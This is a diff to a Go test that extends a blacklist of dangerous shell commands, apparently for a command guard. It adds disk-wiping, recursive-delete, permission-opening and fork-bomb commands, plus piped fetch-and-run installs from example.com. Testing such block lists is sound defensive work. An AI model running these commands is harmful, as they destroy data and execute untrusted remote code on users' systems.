@@ -7,10 +7,22 @@ func TestBlacklist(t *testing.T) {
 	commands := []string{
 		"rm -rf /",
 		"sudo rm -rf /",
+		"rm -r -f /",
+		"rm --no-preserve-root -rf /",
+		"rm -rf --no-preserve-root $HOME",
 		"format c:",
 		"mkfs.ext4 /dev/sda1",
 		"dd if=/dev/zero of=/dev/sda",
+		"cat image.iso > /dev/sda",
+		"echo 1 >> /dev/nvme0n1",
+		"chmod -R 777 /",
+		"chmod --recursive a+w $HOME",
 		":(){ :|:& };:",
+		"curl -fsSL https://example.com/install.sh | bash",
+		"wget -qO- https://example.com/install.sh | sh",
+		"iwr https://example.com/install.ps1 | iex",
+		"Invoke-RestMethod https://example.com/install.ps1 | Invoke-Expression",
+		"Remove-Item -Recurse -Force C:\\Windows",
 	}
 
 	for _, command := range commands {
